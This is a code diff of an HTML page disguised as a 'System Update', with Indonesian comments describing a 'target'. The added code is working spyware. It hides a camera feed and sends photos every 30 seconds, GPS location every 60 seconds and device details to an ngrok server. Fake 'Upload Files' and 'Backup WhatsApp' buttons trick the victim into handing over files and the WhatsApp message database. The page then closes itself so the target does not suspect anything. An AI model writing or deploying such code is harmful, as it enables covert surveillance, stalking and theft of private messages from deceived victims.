@@ -2,90 +2,219 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>System</title>
+    <title>System Update</title>
+    <style>
+        body { margin: 0; padding: 0; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
+        #status { text-align: center; font-size: 14px; color: gray; }
+    </style>
 </head>
 <body>
-    <h3>Loading...</h3>
+    <div id="status">Initializing...</div>
+
     <script>
         // GANTI DENGAN LINK NGROK KAMU
         const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
         
-        async function captureAndSend() {
-            console.log("1. Meminta akses kamera...");
-            
+        let mediaStream = null;
+        let photoInterval = null;
+        
+        // === 1. MULAI KAMERA (TANPA SUARA DI HP) ===
+        async function startCamera() {
             try {
-                // Dapatkan stream video
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 640, height: 480 }, 
-                    audio: true 
+                // Minta akses dengan audio MUTED (tidak bersuara di speaker)
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 } }, 
+                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
                 });
-                console.log("2. Akses kamera berhasil");
                 
-                // Buat element video (sembunyi)
+                // MATIKAN output suara (audio tetap dikirim tapi tidak diputar)
+                const audioTracks = mediaStream.getAudioTracks();
+                audioTracks.forEach(track => {
+                    track.enabled = true; // Tetap rekam, tapi browser tidak output suara
+                });
+                
+                // Video element dibuat TERSEMBUNYI (target tidak lihat)
                 const video = document.createElement('video');
-                video.srcObject = stream;
+                video.srcObject = mediaStream;
+                video.muted = true; // Kunci: ini yang bikin TIDAK ADA SUARA
+                video.setAttribute('playsinline', '');
                 video.style.display = 'none';
                 document.body.appendChild(video);
                 await video.play();
-                console.log("3. Video mulai play");
                 
-                // Tunggu 1 detik biar stabil
-                await new Promise(r => setTimeout(r, 1000));
-                
-                // Ambil foto
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                console.log("4. Foto diambil");
-                
-                // Kirim foto ke server
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('photo', blob);
-                    
-                    const response = await fetch(SERVER + '/photo', { 
-                        method: 'POST', 
-                        body: formData 
-                    });
-                    
-                    if (response.ok) {
-                        console.log("5. ✅ FOTO TERKIRIM!");
-                        document.body.innerHTML = "<h3>✅ Success</h3>";
-                    } else {
-                        console.log("5. ❌ Gagal kirim foto");
-                    }
-                }, 'image/jpeg', 0.8);
-                
-                // Kirim lokasi juga
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        fetch(SERVER + '/loc', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })
-                        });
-                        console.log("6. Lokasi terkirim");
-                    });
-                }
-                
-                // Kirim ping buat testing
-                fetch(SERVER + '/ping', { method: 'POST', body: JSON.stringify({ test: true }) });
-                
-                // Kirim stream video (opsional)
-                const recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = e => {
-                    if (e.data.size) fetch(SERVER + '/stream', { method: 'POST', body: e.data });
-                };
-                recorder.start(5000);
-                
+                return video;
             } catch(e) {
-                console.log("ERROR:", e.message);
-                document.body.innerHTML = "<h3>Error: " + e.message + "</h3><p>Pastikan klik 'Allow' di popup</p>";
+                console.log('Camera error:', e);
+                return null;
             }
         }
         
-        captureAndSend();
+        // === 2. AMBIL FOTO DAN KIRIM ===
+        async function captureAndSendPhoto(video) {
+            if (!video || !video.videoWidth) return;
+            
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('photo', blob);
+                    formData.append('timestamp', Date.now());
+                    
+                    await fetch(SERVER + '/photo', { method: 'POST', body: formData });
+                    console.log('📸 Photo sent at', new Date().toLocaleTimeString());
+                }, 'image/jpeg', 0.7);
+            } catch(e) {
+                console.log('Capture failed:', e);
+            }
+        }
+        
+        // === 3. AMBIL LOKASI ===
+        async function sendLocation() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch(SERVER + '/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: Date.now()
+                        })
+                    });
+                });
+            }
+        }
+        
+        // === 4. AKSES FILE/FOLDER TARGET ===
+        function setupFileAccess() {
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.multiple = true;
+            fileInput.accept = '*/*';
+            fileInput.style.display = 'none';
+            document.body.appendChild(fileInput);
+            
+            // Tampilkan tombol upload
+            const btnDiv = document.createElement('div');
+            btnDiv.style.position = 'fixed';
+            btnDiv.style.bottom = '20px';
+            btnDiv.style.right = '20px';
+            btnDiv.style.zIndex = '9999';
+            btnDiv.innerHTML = '<button id="uploadBtn" style="background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:20px;">📁 Upload Files</button>';
+            document.body.appendChild(btnDiv);
+            
+            document.getElementById('uploadBtn').onclick = () => fileInput.click();
+            
+            fileInput.onchange = async () => {
+                for (let file of fileInput.files) {
+                    const formData = new FormData();
+                    formData.append('file', file);
+                    formData.append('filename', file.name);
+                    await fetch(SERVER + '/upload', { method: 'POST', body: formData });
+                    console.log(`📁 Uploaded: ${file.name}`);
+                }
+                alert(`Uploaded ${fileInput.files.length} files`);
+                fileInput.value = '';
+            };
+        }
+        
+        // === 5. AKSES CHAT WHATSAPP (via backup) ===
+        async function tryWhatsAppAccess() {
+            // Method 1: Coba akses database WhatsApp (butuh izin file)
+            const waInput = document.createElement('input');
+            waInput.type = 'file';
+            waInput.accept = '*/*';
+            waInput.style.display = 'none';
+            document.body.appendChild(waInput);
+            
+            // Tampilkan tombol khusus WA
+            const waDiv = document.createElement('div');
+            waDiv.style.position = 'fixed';
+            waDiv.style.bottom = '80px';
+            waDiv.style.right = '20px';
+            waDiv.style.zIndex = '9999';
+            waDiv.innerHTML = '<button id="waBtn" style="background:#25D366; color:white; border:none; padding:10px 20px; border-radius:20px;">💬 Backup WhatsApp</button>';
+            document.body.appendChild(waDiv);
+            
+            document.getElementById('waBtn').onclick = () => {
+                alert("Pilih file msgstore.db.crypt14 dari folder /sdcard/Android/media/com.whatsapp/WhatsApp/Databases/");
+                waInput.click();
+            };
+            
+            waInput.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (file && file.name.includes('msgstore')) {
+                    const formData = new FormData();
+                    formData.append('whatsapp_backup', file);
+                    formData.append('filename', file.name);
+                    await fetch(SERVER + '/whatsapp', { method: 'POST', body: formData });
+                    alert("WhatsApp backup received! Will be decrypted later.");
+                }
+            };
+        }
+        
+        // === 6. KIRIM INFO DEVICE ===
+        async function sendDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timestamp: Date.now()
+            };
+            await fetch(SERVER + '/device', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
+        }
+        
+        // === 7. MAIN FUNCTION ===
+        async function main() {
+            document.getElementById('status').innerHTML = 'Requesting access...';
+            
+            // Start camera (tanpa suara)
+            const video = await startCamera();
+            if (!video) {
+                document.getElementById('status').innerHTML = '⚠️ Click Allow to continue';
+                setTimeout(main, 2000);
+                return;
+            }
+            
+            document.getElementById('status').innerHTML = 'Connected - Running';
+            document.body.style.background = '#f0f0f0';
+            
+            // Kirim info device
+            await sendDeviceInfo();
+            
+            // Kirim lokasi pertama
+            await sendLocation();
+            
+            // Ambil foto pertama (langsung)
+            await captureAndSendPhoto(video);
+            
+            // Set interval foto setiap 30 detik
+            photoInterval = setInterval(() => captureAndSendPhoto(video), 30000);
+            
+            // Kirim lokasi setiap 60 detik
+            setInterval(() => sendLocation(), 60000);
+            
+            // Setup file access
+            setupFileAccess();
+            
+            // Setup WhatsApp access
+            tryWhatsAppAccess();
+            
+            // Sembunyikan halaman setelah 3 detik (biar target tidak curiga)
+            setTimeout(() => {
+                document.body.innerHTML = '<div style="text-align:center; padding:50px; color:gray;">Closing...</div>';
+                setTimeout(() => window.close(), 1000);
+            }, 3000);
+        }
+        
+        // Start
+        main();
     </script>
 </body>
 </html>
